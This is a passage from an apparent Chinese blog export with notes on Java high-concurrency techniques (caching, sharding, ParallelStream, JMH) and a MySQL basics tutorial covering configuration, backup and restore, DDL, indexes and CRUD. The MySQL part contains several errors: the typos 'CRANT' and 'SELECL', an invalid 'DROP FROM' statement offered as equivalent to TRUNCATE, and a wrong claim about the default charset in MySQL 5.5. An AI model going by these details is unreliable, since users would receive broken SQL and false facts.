语句优化等方式来提高并发度和性能。\n需要注意的是，在实际应用中，系统性能还受到其它多种因素的影响，例如硬件配置、网络带宽、业务规模和复杂度等。\n系统扩容系统扩容包括垂直扩容和水平扩容。\n从应用层的角度来看，垂直扩容是提升服务器的配置，水平扩容是增加服务器的数据。\n缓存缓存包括本地缓存和集中式缓存。\n本地缓存可以使用Guava Cache实现，集中式缓存可以使用Redis实现。\n在实现中，读取数据的步骤是，先读取本地缓存，如果本地缓存中没有要读取的数据，就从集中式缓存中读取，如果集中式缓存中依然没有，则从数据库中读取，然后将数据依次存入集中式缓存和本地缓存。\n分库分表分库分表，顾名思义，就是将原本存储于单个数据库上的数据拆分到多个数据库，把原来存储在单张数据表的数据拆分到多张数据表中，实现数据切分。\n分库分表的实现可以分为两种方式：垂直切分和水平切分。垂直切分是将数据库中的表按照业务划分，将功能相近的业务表独立出来，分开部署；水平切分是将单张数据表中的数据进行划分，分散成多张表存储到多台服务器。\n读写分离通常情况下，数据库的读操作远远多于写操作。通过读写分离，可以利用这一特点，将读操作分发给多个只负责读取数据的从服务器（读库），而将写操作发送给主服务器（写库）。这样一来，主服务器专注于处理写操作，而从服务器处理读操作，从而提高系统的整体性能和并发处理能力。\n秒杀系统的特点秒杀系统的并发量存在瞬时凸峰，也叫做流量突刺现象。\n秒杀系统的技术特点是：瞬时高并发、读多写少、流程简单。\n秒杀系统的三个阶段是：\n\n预热阶段\n用户会刷新秒杀页面，查看秒杀活动，用户的刷新操作可以使部分数据存储到Redis缓存中，所以称为预热。\n\n秒杀阶段\n秒杀阶段会产生瞬时的高并发流量，在这一阶段，要确保已经做好了服务的限流、熔断和降级等。\n\n结算阶段\n\n\n秒杀系统的性能优化方案：\n\n异步解耦\n将秒杀系统的整体流程进行拆分，通过队列的方式控制核心部分，实现异步解耦。\n\n限流防刷\n对秒杀系统的部分业务进行限流、熔断和降级处理。\n\n资源控制\n由于应用层能够承受的并发量比缓存的并发量少很多，所以在高并发系统中，可以使用OpenResty，由负载均衡层访问缓存。\n\n\n分工问题的实现方式Guarded Suspension模式\nThread-Pre-Message模式\n生产者-消费者模式\n两阶段终止模式\nWorker-Thread模式\nBalking模式\nParallelStreamParallelStream 是 JDK 8 中新增的流式 API，它继承自 Java.util.stream.Stream 接口，并提供了并行流（Parallel Stream）处理能力。\n与普通流不同的是，ParallelStream 可以利用多个线程（默认情况下是 ForkJoinPool 中的线程）来并行执行部分或全部流处理操作，以加速大容量数据的处理和分析。在并行流执行流处理操作时，它会将数据划分成多个小块，并分别交给不同的线程进行处理，在处理完成后再将结果合并返回。\nParallelStream 支持大部分 Stream 的 API 操作，例如 filter、map、reduce、sorted 等，只需要调用 parallel() 方法即可将一个普通流转换为并行流。需要注意的是，由于并行流涉及到多线程的协作，因此在使用 ParallelStream 时需要考虑线程安全和共享变量等问题，避免出现并发问题和数据异常。\n以下是一个 ParallelStream 的示例代码：\nList&lt;String&gt; list = Arrays.asList(&quot;java&quot;, &quot;python&quot;, &quot;scala&quot;, &quot;ruby&quot;, &quot;go&quot;);long count = list.parallelStream().filter(str -&gt; str.length() &gt; 4).count();System.out.println(count);\n\n以上代码演示了如何使用 ParallelStream 统计字符串列表中长度大于 4 的字符串数量。由于 ParallelStream 默认使用 ForkJoinPool 的线程池来执行并行计算，因此可以实现更高效的数据统计和分析。\nJMH概述JMH是一款由JVM团队开发的、专门对代码进行基准测试的工具类。\n\n备注：\n基准测试（Benchmark）是一种评估程序性能的方法。通过设计和实现一组具有代表性的测试用例，来测量程序在给定硬件、操作系统和运行环境下的性能指标，如执行时间、内存占用、CPU 占用率等。\n基准测试可以帮助开发人员发现和改正代码中的性能问题，以及比较不同程序或算法之间的性能差异。它也可以为程序优化提供指导，并且对于不同平台或环境下的性能比较也具有参考价值。\n\n使用方法\n导入依赖：使用JMH需要在项目中添加jmh-core和jmh-generator-annprocess依赖。\n创建测试类，在测试类上添加注解@BenchmarkMode、@Warmup、@Measurement、@Threads 等。\n在上一步创建的测试类中编写测试方法，在测试方法上添加注解@Benchmark。\n运行测试方法，测试结果会以表格形式展示出来。\n\n使用示例import org.openjdk.jmh.annotations.*;@BenchmarkMode(Mode.AverageTime)@Warmup(iterations = 3, time = 1)@Measurement(iterations = 5, time = 1)@Threads(8)public class MyBenchmark &#123;    @Benchmark    public void testMethod() &#123;        // 测试代码    &#125;&#125;\n\n在这个示例中，我们定义了一个名为 MyBenchmark 的基准测试类，其中：\n\n@BenchmarkMode 注解指定了测试模式为平均执行时间。\n@Warmup 注解指定了预热次数为 3 次，每次预热时间为 1 秒钟。\n@Measurement 注解指定了测试次数为 5 次，每次测试时间也为 1 秒钟。\n@Threads 注解指定了线程数量为 8。\n\n在方法上，我们使用 @Benchmark 注解来标注需要测试的方法，然后在测试代码中编写需要测试的逻辑。\n使用JMH进行吞吐量测试示例吞吐量（Throughput）指的是在一定时间内能够处理的事务或请求数量，通常用单位时间内完成的请求数量来衡量系统&#x2F;程序的性能。\nJMH 的 Throughput 测试模式用于测试程序的吞吐量，即在给定时间段内程序能够处理的请求总数。\n下面是一个简单的 JMH 吞吐量测试示例：\nimport org.openjdk.jmh.annotations.*;@BenchmarkMode(Mode.Throughput)@Warmup(iterations = 3, time = 1)@Measurement(iterations = 5, time = 1)@Threads(8)public class MyBenchmark &#123;    @Benchmark    public void testMethod() &#123;        // 测试代码    &#125;&#125;\n\n在这个示例中，我们使用了 @BenchmarkMode 注解来指定测试模式为 Mode.Throughput，表示通过统计每单位时间内执行的操作次数来评估程序性能。同时，我们仍然需要设置预热次数、测试次数和线程数量等参数，以确保测试结果的准确性。\n使用JMH进行QPS&#x2F;TPS测试示例QPS（Queries Per Second）和 TPS（Transactions Per Second）都是指每秒钟能够处理的请求数或事务数量，是评估系统性能的重要指标。\nJMH 中没有直接提供 QPS&#x2F;TPS 模式的测试，但通过计算每秒钟能够完成的迭代次数，我们也可以得出相应的指标。\n下面是一个简单的 JMH QPS&#x2F;TPS 测试示例：\nimport org.openjdk.jmh.annotations.*;@BenchmarkMode(Mode.Throughput)@Warmup(iterations = 3, time = 1)@Measurement(iterations = 5, time = 1)@Threads(8)@OutputTimeUnit(TimeUnit.SECONDS)public class MyBenchmark &#123;    @Benchmark    public void testMethod() &#123;        // 测试代码    &#125;&#125;\n\n在这个示例中，我们同样使用了 @BenchmarkMode 注解来指定测试模式为 Mode.Throughput，并且设置了预热次数、测试次数和线程数量等参数。除此之外，我们还添加了 @OutputTimeUnit 注解来指定输出结果的时间单位为秒。\n通过运行测试，并根据测试代码实际执行的操作计算得出每秒钟能够完成的操作次数，即可得到测试的 QPS&#x2F;TPS 值。最终的测试结果会以表格形式展示出来，包括平均值、方差、标准误差和置信区间等统计数据。\nReferences\n冰河. 深入理解高并发编程: JDK核心技术. 北京: 电子工业出版社, 2022.6.\n冰河. 深入理解高并发编程: 核心原理与案例实战. 北京: 电子工业出版社, 2023.2.\n尼恩等. Java高并发核心编程:加强版. 卷2, 多线陈、锁、JMM、JUC、高并发设计模式. 北京: 清华大学出版社, 2022.10.\nhttps://www.bilibili.com/video/BV1xK4y1C7aT?p=2&amp;vd_source=e229b568d11ab1ec4d7f50fb619a17b6\nhttps://docs.oracle.com/javase/8/docs/api/java/util/Queue.html\n\nz\n","categories":["IT"],"tags":["并发"]},{"title":"MySQL","url":"/2023/05/06/MySQL/","content":"MySQL配置MySQL采用客户端-服务器架构，用户通过客户端程序发送增删改查请求，服务器程序收到请求后处理，并把处理结果返回给客户端。\n启动选项MySQL安装目录的bin目录下的执行文件中，有一些是服务器程序（如mysqld），有一些是客户端程序（如mysql）。在命令行中指定启动选项时需要在选项名前加上–前缀，对于有选项值的启动选项，选项名、&#x3D;、选项值之间不能有空白字符。部分选项名有短形式，使用短形式时，选项名前只加上一个-前缀，选项名和选项值之间可以没有间隙，部分短形式的选项名和选项值之间必须没有间隙，短形式的选项名是区分大小写的。\n配置文件大部分启动选项可以在配置文件中进行配置，MySQL程序启动时会在多个路径下寻找配置文件，不同的操作系统下，寻找配置文件的路径和路径的顺序也有所不同，如果在多个配置文件中设置了相同的启动选项，则以最后一个配置文件为准。\n如果不想让MySQL在默认的路径中搜索配置文件，可以在命令行中指定使用default-file选项指定配置文件的位置。\n使用配置文件进行配置时，等号两边可以有空白字符。\n系统变量如允许同时连入的客户端的数量、查询缓存的大小等都是MySQL的系统变量。\n查看系统变量的命令的语法：\nSHOW VARIABLES [LIKE 匹配的模式]\n\n系统变量的作用范围分下面两种：\n\nGLOBAL（全局范围）：影响服务器的整体操作。\n具有GLOBAL作用范围的系统变量可以称为全面变量。\n\nSESSION（会话范围）：影响某个客户端连接的操作。\n具有SESSION作用范围的系统变量可以称为会话变量。\n\n\n部分（有的系统变量是不能修改的，如MySQL的版本）系统变量可以在服务器运行过程中设置（即可设置全面变量，又可设置会话变量），且无需重启服务器；部分只能以启动选项的方式（在命令行中添加启动选项，或在配置文件中进行配置）进行设置（全面变量），如InnDB的页大小。\n设置系统变量的命令的语法：\nSET [GLOBAL|SESSION] 系统变量名 = 值;\n\n监视器打开MySQL监视器打开MySQL监视器的命令格式：\nmysql -u 用户名 -p密码\n\n或者使用命令：\nmysql -u 用户名 -p\n\n然后输入密码即可\n查看字符编码在监视器中查看MySQL中字符编码等的设置情况的命令：\nstatus\n\n或者使用命令：\nSHOW VARIABLES LIKE &#x27;char%&#x27;\n\n修改密码修改密码的命令：\nSET PASSWORD FOR root@localhost=PASSWORD(&#x27;新密码&#x27;)\n\n创建用户创建用户的命令：\nCREATE USER 新用户名 IDENTIFIED BY ‘密码’\n\n用户名需要按照“用户名@主机名”的方式写\n设置用户权限设置用户权限的命令：\nCRANT 赋予的权限 ON 数据库名.表名 TO 用户名\n\n“赋予的权限”如果是所有权限就设为“ALL”，如果仅允许SELECL和UPDATE就设置为“SELECT,UPDATE”\n如果是所有数据库的所有数据表，就设置为“*.*”\n退出监视器退出监视器的命令：\nexit\n\n或者使用命令：\nquit\n\n数据库MySQL的SQL语句后面需要加分号。\n创建数据库创建数据库的命令格式\nCREATE DATABASE 数据库名;\n\n指定使用的数据库use 数据库名\n\nuse不是SQL语句，所以不需要输入“;”\n在使用use选择数据库的状态下也能够操作其他数据库的表，如\nSELECT * FROM db2.table;\n\n在没有use db2的情况下也可以执行\n显示数据库显示当前已有的数据库显示当前已有的数据库的命令：\nSHOW DATABASES;\n\n显示当前使用的数据库SELECT DATABASE();\n\n显示数据库中的所有表SHOW TABLES;\n\n删除数据库在MySQL中，你可以使用DROP DATABASE语句来删除已经存在的数据库。以下是其基本语法：\nDROP DATABASE database_name;\n\n在这里，database_name是你想要删除的数据库的名称。例如，如果你想删除名为my_database的数据库，你可以这样做：\nDROP DATABASE my_database;\n\n这将删除my_database数据库以及其中的所有表和数据。\n请注意，DROP DATABASE语句会永久删除数据库以及其中的所有表和数据，因此在使用之前请确保你真的想要删除该数据库。\n类似地，你也可以使用IF EXISTS子句来避免在尝试删除不存在的数据库时出现错误，语法如下：\nDROP DATABASE IF EXISTS database_name;\n\n如果database_name存在，那么它将被删除。如果它不存在，MySQL将发出一条警告，而不是一个错误，并允许查询继续。这对于自动化脚本或者你不确定数据库是否存在时非常有用，因为它可以防止因尝试删除不存在的数据库而导致的错误。\n备份和恢复数据库MySQL有多种备份数据库的方式，包括物理备份和逻辑备份，在备份时，需要根据实际情况选择最合适的备份方式，并保证备份数据的一致性、完整性和安全性。\n\n物理备份\n\n物理备份是指直接备份MySQL服务器中数据文件的一种方式。这种备份方式直接将数据文件复制到指定的备份目录下，并保持与原始数据文件的完全一致，因此恢复时也很快速。\n物理备份包括两种主要类型：\n\n冷备份：停止MySQL服务后备份数据文件，优点是备份数据的一致性好，缺点是在备份期间无法进行数据库操作。\n热备份：不停止MySQL服务进行备份，优点是可以在备份时继续对数据库进行操作，缺点是备份数据可能会因为正在执行的事务而不完整或不一致。\n\n物理备份的命令可以使用Linux中的cp、rsync等命令，例如：\n$ cp -a /var/lib/mysql /backup/mysql_backup\n\n\n逻辑备份\n\n逻辑备份是指通过SQL语句来生成备份文件，备份数据以可读性较好的文本格式保存，因此备份数据相对于物理备份较大，但可以进行较为精细的筛选和处理。\n逻辑备份包括以下主要类型：\n\nmysqldump：可以备份指定的数据库或表，甚至可以备份数据库中的指定数据，生成.sql格式的备份文件。\nmydumper：适用于大型数据库，生成多个文件来备份数据。\nmysqlpump：在MySQL8.0及以上版本中提供了mysqlpump命令，该命令比mysqldump更快，也支持多线程和压缩。\n\n例如，使用mysqldump备份一个名为mydatabase的数据库：\n$ mysqldump -u root -p mydatabase &gt; mydatabase_backup.sql\n\n在备份时，需要注意一些重要的问题：\n\n备份文件应当保存在安全的位置，并进行良好的加密措施。\n常规的备份操作应当建立合理的时间间隔。\n对于生产环境的数据库，建议还使用主从复制等业务高可用方案来增加数据可靠性。\n\n恢复MySQL备份文件则相对较简单，可以使用以下命令进行：\n$ mysql -u root -p mydatabase &lt; mydatabase_backup.sql\n\n其中，mydatabase是需要恢复的数据库的名称，mydatabase_backup.sql是备份文件的路径。执行后，MySQL会将备份文件中的数据导入到MySQL服务器中，并重新生成所有的索引和约束条件，以保证数据的正确性和完整性。\n在MySQL中，如果备份文件中的数据字符编码与目标数据库不一致，恢复数据时可能会出现乱码等问题。为了避免这种情况，可以通过指定字符集参数来将备份文件中的数据以正确的字符编码导入到目标数据库中。\n以下是根据备份文件的字符集来重新设置字符集的命令示例：\n$ mysql -u root -p mydatabase --default-character-set=utf8 &lt; backup.sql\n\n其中，mydatabase是需要恢复的数据库的名称，backup.sql是备份文件的路径。–default-character-set选项用于指定字符集，可以根据实际情况设置编码类型和字符集。如果备份文件的字符编码为GBK，则可以将上述命令修改如下：\n$ mysql -u root -p mydatabase --default-character-set=gbk &lt; backup.sql\n\n在MySQL 5.5及以上版本中，默认的字符集为utf8mb4，因此如果备份文件中使用的是utf8或gbk等字符集，也需要显式地指定字符集参数。\n另外，在备份时也应当考虑到字符编码的问题，建议在备份时同时备份字符集相关的信息。例如，在进行逻辑备份时，可以添加–set-charset选项来确保备份数据使用与数据库相同的字符集。例如：\n$ mysqldump -u root -p mydatabase --set-charset &gt; mydatabase_backup.sql\n\n这样，在恢复数据时就无需再指定字符集，MySQL会自动使用与备份时相同的字符集导入数据。\n表创建表示例在MySQL中，你可以使用CREATE TABLE语句来创建一个新的表。在CREATE TABLE语句中，你可以指定表名，列名，列的数据类型以及任何附加的约束。\n以下是一个创建新表的基本示例：\nCREATE TABLE table_name (    column1 datatype constraint,    column2 datatype constraint,    column3 datatype constraint,    ....);\n\n在这个例子中，table_name是你要创建的表的名称，column1、column2和column3是列的名称，datatype是列的数据类型，constraint是任何你想在列上应用的约束。\n例如，假设你想创建一个名为students的表，其中有id、name、age和email四个字段。你可以这样做：\nCREATE TABLE students (    id INT AUTO_INCREMENT PRIMARY KEY,    name VARCHAR(100),    age INT,    email VARCHAR(100));\n\n在这个例子中：\n\nid是一个整数类型的列，它自动递增并且是表的主键。\nname和email都是变长字符类型的列，最大长度为100。\nage是一个整数类型的列。\n\n注意，每一行都需要以逗号结束，但是最后一行除外。最后，整个语句需要以分号结束。\n数据库名、表名、列名可以使用&#96;&#96;（反引号）括起来\n输入到列中字符串的值需要用’’（单引号）或者””（双引号）括起来\n创建表时指定字符编码：\nCREATE TABLE 表名 (列名1 数据类型1, 列名2 数据库类型2...) CHARSET=utf8;\n\n设置主键主键的特点：\n\n没有重复的值\n不允许输入空值（NULL）\n\n命令格式：\n在创建表时给主键字段后添加PRIMARY KEY\nCREATE TABLE 表名 (列名1 数据类型1 PRIMARY KEY, 列名2 数据库类型2...);\n\n设置唯一键唯一键（unique key）的特点\n\n不允许重复\n\n允许输入NULL\n\n在创建表时定义唯一键：\nCREATE TABLE table_name (  column1 data_type,  column2 data_type,  UNIQUE (column1));\n\n在已存在的表上添加唯一键：\nALTER TABLE table_nameADD UNIQUE (column1);\n\n设置列可以自动递增自动递增（AUTO_INCREMENT）可以应用于任何整数类型的列。AUTO_INCREMENT属性允许数据库自动为新记录生成一个唯一的数字。通常用于主键。\n使用AUTO_INCREMENT属性，需要满足以下几个条件：\n\n列必须被定义为NOT NULL，因为它必须有值。\n列必须被定义为整数类型（例如，INT，SMALLINT，MEDIUMINT，BIGINT）。\n每个表只能有一个AUTO_INCREMENT列。\n\n示例，将id列定义为AUTO_INCREMENT：\nCREATE TABLE employees (    id INT AUTO_INCREMENT,    name VARCHAR(100),    PRIMARY KEY(id));\n\nMySQL如何设置连续递增字段的初始值：\nCREATE TABLE tablename (    id INT(11) NOT NULL AUTO_INCREMENT,    name VARCHAR(255) NOT NULL,    PRIMARY KEY (id)) AUTO_INCREMENT=1000;\n\n如果已经创建了表，并且想改变AUTO_INCREMENT的值，可以使用ALTER TABLE命令：\nALTER TABLE tablename AUTO_INCREMENT = 1000;\n\n注意，不能将AUTO_INCREMENT的值设置为比当前最大值小的数，因如果这样做，MySQL将忽略此次设置并保持当前最大值。\n设置列的默认值在MySQL中，可以在创建表或修改表的时候设置字段的默认值。这个默认值将被用于任何未指定该列值的新行。\n\n在创建表的时候设置默认值：\n\nCREATE TABLE tablename (    columnname1 INT NOT NULL DEFAULT 1,    columnname2 VARCHAR(255) NOT NULL DEFAULT &#x27;default_value&#x27;);\n\n在这个例子中，我们创建了一个名为”tablename”的表，它有两个字段，”columnname1”和”columnname2”。对于”columnname1”，如果在插入新的行时没有指定它的值，那么它的值将默认为1。对于”columnname2”，如果在插入新的行时没有指定它的值，那么它的值将默认为’default_value’。\n\n修改已经存在的表，为字段设置默认值：\n\nALTER TABLE tablename MODIFY columnname1 INT NOT NULL DEFAULT 1,MODIFY columnname2 VARCHAR(255) NOT NULL DEFAULT &#x27;default_value&#x27;;\n\n在这个例子中，我们更改了”tablename”表中”columnname1”和”columnname2”字段的默认值。\n注意，不能为NOT NULL的字段设置默认值为NULL。对于字符串类型的字段，默认值需要用引号引起来。对于日期和时间类型的字段，可以将默认值设置为CURRENT_TIMESTAMP。\n索引（创建、删除、查看、主键索引、唯一索引、全局索引）在MySQL中，索引是用来加速查询操作的一种数据结构。它们可以让数据库引擎快速找到表中的特定记录。如果事先在表上创建了索引，查找时就不需要对全表进行扫描，而是利用索引进行扫描。\n下面是一些关于MySQL索引的基础知识：\n\n创建索引： 创建索引可以使用 CREATE INDEX （关键字INDEX可以替换为关键字KEY）命令。例如：\nCREATE INDEX index_nameON table_name (column1, column2);\n\n在上面的命令中，index_name 是索引的名称，table_name 是你要在其上创建索引的表的名称，column1 和 column2 是你想在其中创建索引的列。\n\n删除索引： 删除索引可以使用 DROP INDEX 命令。例如：\nDROP INDEX index_name ON table_name;\n\n查看索引： 如果你想看一个表的所有索引，可以使用 SHOW INDEX 命令。例如：\nSHOW INDEX FROM table_name;\n\n主键索引： 主键（PRIMARY KEY）自动创建唯一索引。每个MySQL表只能有一个主键。\n\n唯一索引： 唯一索引（UNIQUE INDEX）不允许任何重复值。它们可以是主键，也可以不是。\n唯一索引（Unique Index）的设置：\n\n在创建表时定义唯一索引：\nCREATE TABLE table_name (  column1 data_type,  column2 data_type,  UNIQUE INDEX index_name (column1));\n\n在已存在的表上添加唯一索引：\nALTER TABLE table_nameADD UNIQUE INDEX index_name (column1);\n\n\n全文索引： 全文索引（FULLTEXT INDEX）用于全文搜索。只有CHAR、VARCHAR和TEXT列可以创建全文索引。\n\n\n使用索引的缺点：\n\n会占用额外的磁盘空间\n在执行插入、更新或删除操作时，索引也需要被更新，有耗时\n如果被创建索引的列中重复值较多，即使在该列上创建索引也不会提高处理速度\n\n显示表结构ESC或者DESCRIBE，用于显示指定表的列结构，包括列名、数据类型、是否允许NULL，以及其他关于列的信息。\n运行这个命令会返回以下信息：\n\nField：列的名称。\nType：列的数据类型和长度。\nNull：如果列可以包含NULL值，这个字段会显示”YES”，否则显示”NO”。\nKey：如果列是某种键，这个字段会显示键的类型。”PRI”表示主键，”UNI”表示唯一键，”MUL”表示这个列是一个非唯一索引，或者这个列是多个列的一部分，这些列作为复合主键或复合索引，也可能是外键。\nDefault：列的默认值。如果没有指定默认值，这个字段会显示NULL。\nExtra：其他的额外信息，例如，如果列被定义为AUTO_INCREMENT，这个字段就会显示”AUTO_INCREMENT”。\n\n，命令如下：\nDESC 表名;\n\n输出示例：\n+-------+--------------+------+-----+---------+----------------+| Field | Type         | Null | Key | Default | Extra          |+-------+--------------+------+-----+---------+----------------+| id    | int(11)      | NO   | PRI | NULL    | auto_increment || name  | varchar(100) | YES  |     | NULL    |                |+-------+--------------+------+-----+---------+----------------+\n\n查看创建表的SQL语句\nSHOW CREATE TABLE语句\n\nSHOW CREATE TABLE语句可用于查看创建表的SQL语句，包括所有列、键和约束：\nSHOW CREATE TABLE table_name;\n\n返回结果示例：\nCREATE TABLE `employee` (  `id` int NOT NULL,  `emp_id` char(10) DEFAULT NULL,  `emp_name` varchar(10) DEFAULT NULL,  `manager_id` char(10) DEFAULT NULL,  PRIMARY KEY (`id`)) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci\n\n修改表在MySQL中，你可以使用ALTER TABLE语句来修改已经存在的表。使用ALTER TABLE命令修改列的结构，根据修改类型，可以使用带有CHANGE、MODIFY、ADD、DROP的语句。\n以下是一些常见的表修改操作：\n\n添加列：\nALTER TABLE table_nameADD column_name datatype;\n\n例如，如果你想在students表中添加一个名为address的新列，你可以这样做：\nALTER TABLE studentsADD address VARCHAR(255);\n\n把列添加到指定位置的命令格式：\nALTER TABLE 表名 ADD 列名 数据类型 AFTER 放在这个列之后;\n\n示例：\nALTER TABLE tb1 ADD birth DATETIME AFTER employeeId;\n\n删除列：\nALTER TABLE table_nameDROP COLUMN column_name;\n\n例如，如果你想从students表中删除address列，你可以这样做：\nALTER TABLE studentsDROP COLUMN address;\n\n修改列的数据类型：\nALTER TABLE table_nameMODIFY COLUMN column_name datatype;\n\n即使数据类型不变，也依然需要指定修改后的数据类型\n例如，如果你想修改students表中age列的数据类型为SMALLINT，你可以这样做：\nALTER TABLE studentsMODIFY COLUMN age SMALLINT;\n\n重命名列：\nALTER TABLE table_nameCHANGE COLUMN old_column_name new_column_name datatype;\n\n例如，如果你想将students表中的email列重命名为email_address，你可以这样做：\nALTER TABLE studentsCHANGE COLUMN email email_address VARCHAR(100);\n\n即使数据类型不变，也依然需要指定修改后的数据类型\n\n添加唯一键、主键或索引：\nALTER TABLE table_nameADD UNIQUE (column_name);ALTER TABLE table_nameADD PRIMARY KEY (column_name);ALTER TABLE table_nameADD INDEX index_name (column_name);\n\nALTER TABLE语句会锁定表，直到操作完成。\n\n\n复制表复制整张表在MySQL中，你可以通过创建新表并从现有表中复制数据来复制表。下面是一种方法：\nCREATE TABLE new_table AS SELECT * FROM existing_table;\n\n在这里，new_table是你想要创建的新表的名称，existing_table是你想要复制数据的现有表的名称。这个操作将创建一个新表，并将现有表中的所有数据复制到新表中。\n需要注意的是，使用这种方法创建的新表不会包含现有表的索引、主键、唯一键和其他约束。如果你需要复制这些属性，你需要使用其他方法，例如先使用CREATE TABLE语句创建表和相应的约束，然后使用INSERT INTO ... SELECT语句复制数据：\nCREATE TABLE new_table LIKE existing_table; INSERT INTO new_table SELECT * FROM existing_table;\n\n在这个例子中，CREATE TABLE new_table LIKE existing_table;语句创建一个与现有表结构（包括索引和约束）完全相同的新表，但不包含任何数据。然后，INSERT INTO new_table SELECT * FROM existing_table;语句将现有表中的所有数据复制到新表中。\n复制符合条件的记录当另一个表已经存在时，可以使用 INSERT INTO SELECT 语句来从一个表复制符合条件的记录到另一个表中。具体来说，INSERT INTO SELECT 语句会将一个查询结果插入到指定的表中。\n以下是一个使用 INSERT INTO SELECT 语句复制符合条件的记录的示例如下：\nINSERT INTO newtable (col1, col2, ...)\tSELECT col1, col2, ...FROM oldtable\tWHERE condition;\n\n在这个例子中，我们把符合查询条件的列数据从旧表 oldtable 复制到新表 newtable。选择需要复制的列，并通过 WHERE 子句指定要复制的特定行。\n需要注意的是，在执行 INSERT INTO SELECT 语句之前，我们必须先创建新表，并保证它与旧表拥有相同的结构。此外，也可以为新表添加索引或其他约束，以确保数据完整性和查询性能。\n还可以在 SELECT 语句中使用 JOIN、GROUP BY、HAVING 等功能来实现更加复杂的查询操作。例如，我们可以使用 JOIN 连接多个表，并根据多个条件对记录进行筛选，最终将满足条件的记录插入到新表中。\n如果需要将一个表中符合条件的记录复制到一个新表中，并且该表不存在，可以使用以下语句：\nCREATE TABLE newtable\tSELECT col1, col2, ...FROM oldtable\tWHERE condition;\n\n这条 CREATE TABLE AS 语句会首先创建一个名为 newtable 的新表，然后将满足 WHERE 子句指定的条件的所有行从 oldtable 复制到新表中。\n需要注意的是，新表的列会自动继承 SELECT 列出的列的名称和数据类型。如果需要重新命名列或更改其数据类型，则可以使用 AS 或其他列定义语法来修改列属性。例如：\nCREATE TABLE newtable\tSELECT id AS new_id, name, CAST(age AS VARCHAR(10)) AS age_strFROM oldtable\tWHERE condition;\n\n在这个例子中，我们在 SELECT 语句中为新表定义了新的列名和数据类型，并将旧表的 id 列重命名为 new_id。最终，MySQL 将会根据 SELECT 语句的结果集自动创建新表的结构，并将所有符合条件的记录插入到新表中。\n总而言之，CREATE TABLE AS 是一个强大的功能，它可以帮助我们快速创建一个新表并复制符合特定条件的记录。无论是用于数据备份、数据迁移还是进行数据分析，都是非常有用的工具。\n删除表删除整张表在MySQL中，你可以使用 DROP TABLE 语句来删除已经存在的表。以下是其基本语法：\nDROP TABLE table_name;\n\n在这里，table_name 是你想要删除的表的名称。例如，如果你想删除名为 students 的表，你可以这样做：\nDROP TABLE students;\n\n此外，在目标表不存在的情况下执行DROP命令会发生错误，如果和IF EXISTS子句一起使用，就可以避免在试图删除不存在的表时出现错误。下面是如何使用它的语法：\nDROP TABLE IF EXISTS table_name;\n\n在这里，table_name是你想要删除的表的名称。例如，如果你想删除名为students的表，你可以这样做：\nDROP TABLE IF EXISTS students;\n\n如果students表存在，上述语句将删除它。如果students表不存在，MySQL将发出一条警告，而不是一个错误，并允许查询继续。\n删除表内所有记录请注意，DROP TABLE 语句会永久删除表以及表中的所有数据，因此在使用之前请确保你真的想要删除该表。如果你只是想删除表中的所有数据，但是想保留表的结构（例如列的定义和约束），你应该使用 TRUNCATE TABLE 语句，在MySQL中，TRUNCATE是一个DDL（数据定义语言）语句，用于删除表中的所有记录如下：\nTRUNCATE TABLE table_name;\n\n在这个例子中，TRUNCATE TABLE students; 会删除 students 表中的所有数据，但是表本身和其结构仍然存在。\n或者使用如下命令也可以达到同样的效果：\nDROP FROM table_name;\n\n查询数据SELECT 列名1, 列名2... FROM 表名;\n\nSELECT * FROM 表名;\n\nSELECT &#x27;会将这段文字输出&#x27;\n\nSELECT (1+2)*3;\n\n插入记录在MySQL中，可以使用INSERT INTO语句向表中插入数据。以下是几个例子：\n\n插入完整的行数据：\n在这种情况下，你需要提供表中每个列的值。\nINSERT INTO table_name (column1, column2, column3, ...)VALUES (value1, value2, value3, ...);\n\n例如，如果你有一个名为students的表，它有id, name, age, email四个列，你可以这样插入数据：\nINSERT INTO students (id, name, age, email)VALUES (1, &#x27;John Doe&#x27;, 20, &#x27;johndoe@example.com&#x27;);\n\n注意：如果你的表有一个设置了AUTO_INCREMENT的列（如id列），你可以在插入数据时省略该列，MySQL会自动为它分配一个值。\n\n插入特定列的数据：\n在这种情况下，你只需要提供你想插入的列的值。\nINSERT INTO table_name (column1, column2, ...)VALUES (value1, value2, ...);\n\n例如，如果你只想插入students表中的name和email：\nINSERT INTO students (name, email)VALUES (&#x27;John Doe&#x27;, &#x27;johndoe@example.com&#x27;);\n\n插入多行数据：\n你可以一次插入多行数据，只需在VALUES关键字后面列出所有的值。\nINSERT INTO table_name (column1, column2, ...)VALUES (value1, value2, ...),(value1, value2, ...),...;\n\n例如：\nINSERT INTO students (name, email)VALUES (&#x27;John Doe&#x27;, &#x27;johndoe@example.com&#x27;),(&#x27;Jane Doe&#x27;, &#x27;janedoe@example.com&#x27;);\n\n更新记录在MySQL中，你可以使用UPDATE语句来更新已经存在的记录。以下是其基本语法：\nUPDATE table_nameSET column1 = value1, column2 = value2, ...WHERE condition;\n\n在这里，table_name是你想要更新记录的表的名称，column1, column2, … 是你想要更新的列的名称，value1, value2, … 是你想设置的新值，condition是用于确定哪些记录应该被更新的条件。如果没有使用WHERE设置条件，列中的所有记录都会被替换掉，为防止这种情况发生，在启动MySQL监视器的时候，可以加上–safe-update选项，使用此选项后，如果没有WHERE条件就无法执行UPDATE或DELETE。\n以下是一个例子：\nUPDATE studentsSET age = 21, email = &#x27;newemail@example.com&#x27;WHERE name = &#x27;John Doe&#x27;;\n\n这个语句会在students表中找到所有名字为John Doe的记录，并将它们的age列设置为21，email列设置为newemail@example.com。\n请注意，如果你省略了WHERE子句，UPDATE语句将更新表中的所有记录。因此，除非你真的想更新所有记录，否则应始终在使用UPDATE语句时包含WHERE子句。\n另外，你应该谨慎使用UPDATE语句，因为一旦记录被更新，你就不能撤销更改。在更新重要的表之前，你应该考虑备份数据。\n删除记录在 MySQL 中，可以使用 DELETE 语句删除表中的记录。以下是一些常见的用法和语法：\n\n删除整个表中的所有记录\n\nDELETE FROM table_name;\n\n这条语句将会从表 table_name 中删除所有记录。需要注意的是，DELETE 操作无法撤销，因此务必谨慎地使用。\n\n删除符合条件的记录\n\nDELETE FROM table_name WHERE condition;\n\n这条语句将会从表 table_name 中删除满足指定条件的记录。例如，我们可以将下面的语句用于删除年龄大于 30 岁的人员信息：\nDELETE FROM person WHERE age &gt; 30;\n\n\n删除部分符合条件的记录\n\n有时候，我们可能只想删除表中的前几行数据，或者只删除满足某些条件的前几行数据。可以使用 LIMIT 